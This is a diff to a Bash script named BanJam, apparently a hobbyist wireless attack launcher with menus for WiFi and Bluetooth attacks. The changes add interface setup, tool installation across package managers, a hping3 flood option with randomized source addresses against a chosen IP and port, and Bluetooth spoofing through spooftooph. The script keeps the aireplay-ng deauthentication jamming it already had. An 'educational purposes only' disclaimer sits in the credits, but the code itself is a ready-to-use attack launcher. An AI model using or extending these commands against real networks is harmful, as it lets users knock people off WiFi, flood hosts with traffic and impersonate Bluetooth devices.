@@ -4,6 +4,7 @@
 RED='\033[0;31m'
 GREEN='\033[0;32m'
 YELLOW='\033[1;33m'
+ORANGE='\033[38;5;208m'
 BLUE='\033[0;34m'
 NC='\033[0m' # No Color
 
@@ -15,17 +16,39 @@ echo -e "$BLUE | |_) | (_| | |  | | |____|  | |__| | (_| | |  | |  | |  $RED \  
 echo -e "$BLUE |____/ \__,_|_|  |_|          \_____/\__,_|_|  |_|  |_|    $NC    /_/  \_\           "
 
 sleep 1
-
+echo
+echo -e "$YELLOW[REMINDER]: Please make sure to configure your Wireless/BLE Interface before running BanJam Attacks. $NC"
+echo -e "You can configure your interfaces using the config menu under$RED WiFi/BLE Configuration $NC"
+sleep 2
+echo
+echo -e "$YELLOW[REMINDER]: Make sure your Subprocesses are installed before starting any attacks. $NC"
+echo -e "You can check and install the required subprocesses under the$RED Update Subprocesses$NC section."
+sleep 2
 echo
 echo -e "$NC Loading BanJam... Please Select from the Menu Below."
-echo
-
 sleep 1
 
+config_menu() {
+    while true; do
+        echo
+        echo -e "$NC[--- WiFi/BLE Configuration Menu ---]"
+        echo "1) Configure WiFi Interface"
+        echo "2) Configure BLE Interface"
+        echo "99) Exit To Main Menu"
+        read -p "Set>" configchoice
+
+        case $configchoice in
+            1) WiFiConfig ;;
+            2) BLEConfig ;;
+            99) break ;;
+            *) echo "$RED Invalid Option $NC" ;;
+        esac
+    done
+}
 # Selecting an interface (setup monitering mode airmon-ng)
- 
+WiFiConfig() {
     echo
-    echo -e "$GREEN [ Wireless Interfaces Found ]"
+    echo -e "$GREEN [ WiFi Interfaces Found ]$NC"
     echo
     printIface=$(ip a)
     echo -e "$NC $printIface"
@@ -33,12 +56,28 @@ sleep 1
     echo "$NC Select Your Interface:"
     read -p "Set>" $Iface
     echo
-    echo "$YELLOW Setting Wifi Interface to Monitering Mode..."
+    echo -e "$YELLOW Setting Wifi Interface to Monitering Mode...$NC"
     sudo airmon-ng check kill $Iface
     sleep 1
     sudo airmon-ng start $Iface
+}
+BLEConfig() {
+    echo
+    echo -e "$GREEN [ Bluetooth Interfaces Found ]$NC"
+    echo
+    printIface=$(hciconfig -a)
+    echo -e "$NC $printIface"
+    echo
+    echo "$NC Select Your Interface:"
+    read -p "Set>" $Iface
+    echo
+    echo -e "$YELLOW Setting BLE Interface to Monitering Mode...$NC"
+    sudo hciconfig $Iface down
+    sleep 1
+    sudo hciconfig $Iface up
+}
 
-#Subproccess Import and Checker
+#Subprocess Import and Checker
 
 subprocess_check() {
 
@@ -46,58 +85,106 @@ echo ""
 echo "====[WELCOME TO BANJAM SUBPROCESS IMPORT & CHECKER]===="
 echo
 sleep 2
+echo
+echo "Finding Supported Package Manager..."
+echo
 
-checktool(){
-local tool=$1
-echo "Checking for $tool..."
+#Checks package manager
+detect_pm() {
+if command -v apt >/dev/null 2>&1; then echo apt
+elif command -v dnf >/dev/null 2>&1; then echo dnf
+elif command -v yum >/dev/null 2>&1; then echo yum
+elif command -v pacman >/dev/null 2>&1; then echo pacman
+elif command -v zypper >/dev/null 2>&1; then echo zypper
+elif command -v apk >/dev/null 2>&1; then echo apk
+elif command -v brew >/dev/null 2>&1; then echo brew
+else echo ""
+fi
+}
+
+PM=$(detect_pm)
+if [ -n "$PM" ]; then
+echo -e "Detected Package Manager:$GREEN $PM $NC"
+echo
+else
+echo -e "$RED No supported package manager detected. $NC"
+echo
+fi
 sleep 1
 
-if ! command -v "$tool" > /dev/null 2>&1; then
-   echo -e "$tool $RED [NOT INSTALLED]$NC"
-   read -p "Would you like to install $tool now? (y/n): " install_choice
-   install_choice=$(echo "$install_choice" | xargs)
+install_tool() {
+local tool=$1
 
-   if [[ "$install_choice" =~ ^[Yy](es)?$ ]]; then
-      sudo apt install -y "$tool"
+case "$PM" in
+   apt) sudo apt update && sudo apt install -y "$tool" ;;
+   dnf) sudo dnf install -y "$tool" ;;
+   yum) sudo yum install -y "$tool" ;;
+   pacman) sudo pacman -Sy --noconfirm "$tool" ;;
+   zypper) sudo zypper install -y "$tool" ;;
+   apk) sudo apk add "$tool" ;;
+   brew) brew install "$tool" ;;
+   *)
+   echo -e "$RED No supported package manager detected.$NC"
+   echo "Install $tool manually (e.g. from your distro's repos or the project's site)."
+   return 1
+   ;;
+esac
+sleep 1
+return 0
+}
+
+#Checks to see if the tools are installed and working
+checktool() {
+local tool=$1
+
+if [ -n "$PM" ]; then
+   echo "Checking for $tool..."
+   sleep 1
+
+   if ! command -v "$tool" > /dev/null 2>&1; then
+      echo -e "$tool $RED [NOT INSTALLED]$NC"
+      read -p "Would you like to install $tool now? (y/n): " install_choice
+      install_choice=$(echo "$install_choice" | xargs)
+
+      if [[ "$install_choice" =~ ^[Yy](es)?$ ]]; then
+         if ! install_tool "$tool"; then
+            echo -e "$ORANGE Installation Failed or unsupported. Please install $tool manually. $NC"
+         fi
+      else
+         echo -e "$NC Skipping installation of $tool"
+      fi
    else
-      echo -e "$NC Skipping installation of $tool"
+      if "$tool" --help > /dev/null 2>&1; then
+	      echo -e "$tool $GREEN [PROPERLY INSTALLED]$NC"
+      else
+	      echo -e "$ORANGE Warning: $tool [INSTALLED, BUT NOT WORKING PROPERLY] $NC"
+      fi
    fi
 else
-   if "$tool" --help > /dev/null 2>&1; then
-	echo -e "$tool $GREEN [PROPERLY INSTALLED]."
-   else
-	echo -e "$YELLOW Warning: $tool [INSTALLED, BUT NOT WORKING PROPERLY]$NC"
-   fi
+   echo -e "$ORANGE No supported package manager detected. Please install $tool manually. $NC"
+   echo
 fi
-echo ""
+
 }
+
 # adding tools here
 checktool airmon-ng
 checktool airodump-ng
 checktool aircrack-ng
 checktool hping3
-checktool fastfetch
+checktool hciconfig
+checktool hcitool
+checktool sdptool
+checktool spooftooph
+checktool btscanner
+checktool fastfetch #this one is in here just to check my subprocess logic (This is not needed within the actual script)
 
+echo
 echo -e "$GREEN====[SUBPROCESS CHECK COMPLETED]====$NC"
 read -n 1 -s -r -p $'Press any Key to Return To Main Menu...'
-# OLD subprocess
-#if command -v aireplay-ng && airmon-ng && airodump-ng >/dev/null 2>&1; then
- #   echo -e "$NC Subproccesses are Intalled, Checking Usability..."
-  #  echo
-   # if command -v aireplay-ng && airmon-ng && airodump-ng --help >dev/null 2>&1; then
-#	echo -e "$GREEN Subproccess successuly working$NC"
- #       echo
-  #  else
-#	echo -e "$YELLOW Subproccess Imported But Not Executed Properly$NC"
- #       echo
-  #  fi
-#else 
- #   echo -e "$RED Subproccess not installed properly$NC"
-#    echo
-#fi
+
 sleep 2
 }
-
 
 # Menu Selects
 
@@ -109,78 +196,154 @@ while true; do
     echo -e "$NC[--- Wifi Jammer Type Menu ---]"
     echo "1) Deauth Jammer Attack (Broadcast)"
     echo "2) Targeted Deauth Jammer Attack"
-    echo "3) DDOS Bandwidth Jammer Attack"
+    echo "3) DOS Bandwidth Jammer Attack"
     echo "99) Exit To Main Menu"
     read -p "Set>" wifichoice
 
 case $wifichoice in
-        1) echo ">> Preparing Wifi $RED Attack $NC Config..."
-        sleep 1
-        echo
-        echo "What is Your Target BSSID: "
-        sleep 1
-        read -p "Set>" $BSSID0
-        echo
-        echo "Launching Attack"
-        echo
-        sleep 1
-        aireplay-ng --deauth 0 -b $BSSID0 $Iface;;
-        2) echo "Preparing Targeted Deauth Jammer Attack Config..."
-        echo
-        sleep 1
-        echo "What is Your Tareted BSSID: "
-        read -p "Set>" $BSSID1 $Iface
-        echo
-        sleep 1
-        echo "What is Your Targeted MAC Address: "
-        read -p "Set>" $MAC
-        echo
-        echo "Launching Attack"
-        echo
-        sleep 1
-        aireplay-ng --deauth 0 -b $BSSID1 -c $MAC $Iface;;
-        99) break;;
-        *) echo ">> Invalid Selection";;
-    esac
-    read -n 1 -s -r -p $'\nPress Any Key to Return to Main Menu'
+      1) echo ">> Preparing Wifi $RED Attack $NC Config..."
+      sleep 1
+      echo
+      echo "What is Your Target BSSID: "
+      sleep 1
+      read -p "Set>" $BSSID0
+      echo
+      echo "Launching Attack"
+      echo
+      sleep 1
+      aireplay-ng --deauth 0 -b $BSSID0 $Iface;;
+      2) echo ">> Preparing Targeted Deauth Jammer Attack Config..."
+      echo
+      sleep 1
+      echo "What is Your Tareted BSSID: "
+      read -p "Set>" $BSSID1 $Iface
+      echo
+      sleep 1
+      echo "What is Your Targeted MAC Address: "
+      read -p "Set>" $MAC
+      echo
+      echo "Launching Attack"
+      echo
+      sleep 1
+      aireplay-ng --deauth 0 -b $BSSID1 -c $MAC $Iface;;
+      3) echo ">> Preparing DOS Bandwidth Jammer Attack Config..."
+      echo
+      sleep 1
+      echo "What is your Target IP:"
+      read -p "Set>" $TARGETIP
+      sleep 1
+      echo
+      echo "which port would you like to target?"
+      read -p "Set>" $PORT
+      sleep 1
+      echo
+      echo "What is your Target Port:"
+      sleep 1
+      echo
+      echo "How many packets would you like to send? (number only)"
+      read -p "Set>" $PACKETS
+      sleep 1
+      echo
+      echo "what type of packets would you like to send?"
+      echo -e "$NC Packet Types:"
+      echo "1) TCP"
+      echo "2) UDP"
+      echo "3) ICMP"
+      read -p "Set>" $PACKETTYPE
+      case $PACKETTYPE in
+         1) hping3 -c $PACKETS -v -p $PORT --flood --rand-source -S $TARGETIP;;
+         2) hping3 -c $PACKETS -v -p $PORT --flood --rand-source -U $TARGETIP;;
+         3) hping3 -c $PACKETS -v -p $PORT --flood --rand-source -I $TARGETIP;;
+         *) echo ">> Invalid packet type" ;;
+      esac;;      
+      99) echo "Exiting to Main Menu..."
+      break;;
+      *) echo ">> Invalid Selection";;
+   esac
+read -n 1 -s -r -p $'\nPress Any Key to Return to Main Menu'
 done
 }
 
-#MAIN PROCESS
+#BLE Attack Menu
+blesub_menu() {
+   while true; do
+    echo
+    echo
+    echo -e "$NC[--- Bluetooth Low Energy (BLE) Attack Menu ---]"
+    echo "1) Bluetooth Scanner (GUI Based)"
+    echo "2) SpoofTooph (Bluetooth Spoofing)"
+    echo "99) Exit To Main Menu"
+    read -p "Set>" blechoice
+      case $blechoice in
+         1) echo -e ">> Preparing$RED BTScanner$NC..."
+         sleep 1
+         echo -e "$YELLOW[REMINDER]: In order to get back into this menu you will need to exit out of the Btscanner application. Do not close the terminal window."
+         sleep 3
+         btscanner &
+         PID=$!
+         sleep 1
+         wait $PID;;
+         2) echo ">> Preparing SpoofTooph (Bluetooth Spoofing) Configuration..."
+         echo "What is Your Target MAC Address eg (00:11:22:33:44:55):  "
+         read -p "Set>" $MAC
+         echo
+         echo "What Do you want the name of your spoofed device to be called?"
+         read -p "Set>" $SPOOFEDNAME
+         echo
+         echo -e "Launching$RED Attack...$NC"
+         echo
+         sleep 1
+         spooftooph -a $MAC -n $SPOOFEDNAME;;
+         99) echo "Exiting to Main Menu..."
+         break;;
+         *) echo "$RED >>> Invalid Selection$NC";;
+      esac
+read -n 1 -s -r -p $'\nPress Any Key to Return to Main Menu'
+done
+}
 
+#MAIN PROCESS and Main Menu
 
 while true; do
-    echo
-    echo
-    echo "[--- Jammer Type Selection Menu ---]"
-    echo "1) Wifi Jammer Attack"
-    echo "2) Bluetooth Low Energy (BLE)"
-    echo "3) Update BanJam"
-    echo "4) Credits and About"
-    echo "99) Exit BanJam"
-    echo ""
-    read -p "set> " choice
+   echo
+   echo
+   echo "[--- Main Selection Menu ---]"
+   echo "1) WiFi Attacks"
+   echo "2) Bluetooth Low Energy (BLE)"
+   echo "3) WiFi/BLE Configuration"
+   echo "4) Update Subproccesses"
+   echo "5) Credits and About"
+   echo "99) Exit BanJam"
+   echo ""
+   read -p "set> " choice
 
-    case "$choice" in
-        1) echo ">> Launching Wifi Jammer Attack Cofig..."
-	sleep 1
-	clear
-	wifisub_menu;;
-        2) echo ">> Launching BLE Jammer Attack...";;
-        3) echo ">> Checking Subprocesseses for BanJam..."
+   case "$choice" in
+        1) echo ">> Launching Wifi Jammer Attack Cofig Menu..."
+	      sleep 1
+	      clear
+	      wifisub_menu;;
+        2) echo ">> Launching BLE Jammer Attack Menu..."
+        sleep 1
+        clear
+        blesub_menu;;
+        3) echo ">> Launching Config Menu..."
+        sleep 1
+        clear
+        config_menu;;
+        4) echo ">> Checking Subprocesseses for BanJam..."
         sleep 2
         subprocess_check
-	sleep 3;;
-        4) echo ">> Loading Credits..."
+	     sleep 3;;
+        5) echo -e "$BLUE >> Loading Credits...$NC"
 	sleep 2
 	echo
         echo -e "Concept & Development Designed, scripted, and endlessly refined by $BLUE[IdontByte :0 ]$NC"
         echo
 	sleep 2
-        echo "Made with a deep passion for  Cybersecurity, Wifi Penntesting, Ethical Hacking, Coding (Its more like a love hate relationship) and just a touch of creativity."
+        echo -e "Made with a deep passion for$BLUE Cybersecurity,$RED Wifi Penntesting,$GREEN Ethical Hacking,$YELLOW Coding (Its more like a love hate relationship)$NC and just a touch of creativity."
         echo
 	sleep 2
-echo -e "$GREEN Toolchain Integration $NC"
+echo -e "$GREEN Toolchain Integration "
 sleep 1
 echo "- Aireplay-ng"
 sleep 1
@@ -190,6 +353,10 @@ echo "- Shell scripting (Bash)"
 sleep 1
 echo "- Linux CLI utilities"
 sleep 1
+echo "- hciconfig & hcitool & spitool"
+sleep 1
+sleep 1
+echo -e "- SpoofTooph & BTScanner$NC"
 echo -e "A hint of $RED AI $NC for troubleshooting..."
 sleep 1
 echo -e "$YELLOW And Last But Not Least... $NC (DRUMROLL PLEASE)..."
@@ -197,10 +364,10 @@ sleep 3
 echo -e "$RED - My Last Strand of Sanity $NC :0"
 echo
 sleep 2
-echo "BanJam’s menu aesthetics, ASCII layout, and terminal presence are inspired by retro hacking culture and the design spirit of tools like SEToolKit and also Airgeddon"
+echo "BanJam's menu aesthetics, ASCII layout, and terminal presence are inspired by retro hacking culture and the design spirit of tools like SEToolKit and also Airgeddon"
 echo
 sleep 2
-echo -e "$YELLOWDISCLAIMER: This tools is used for $RED ETHICAL $YELLOW and $RED EDUCATIONAL $YELLOW purposes only. Please use this tool ethically and on your own equipend. I hope you enjoy :)$NC"
+echo -e "$ORANGE DISCLAIMER: This tools is used for $RED ETHICAL $ORANGE and $RED EDUCATIONAL $ORANGE purposes only. Please use this tool ethically and on your own equipend. I hope you enjoy :)$NC"
 sleep 2
 echo
 echo -e "$BLUE Feel Free to Check out some of my other projects as Well :). My Github is $NC Nickheerkens04."
@@ -241,10 +408,9 @@ echo;;
       sleep 1
       sudo airmon-ng stop $Iface
       sudo systemctl start NetworkManager; break;;
-      *) echo ">> Invalid selection. Try again." ;;
+      *) echo -e "$RED >> Invalid selection. Try again. $NC" ;;
     esac
    read -n 1 -s -r -p $'\nPress any key to return to menu...'
 done
-
 
 
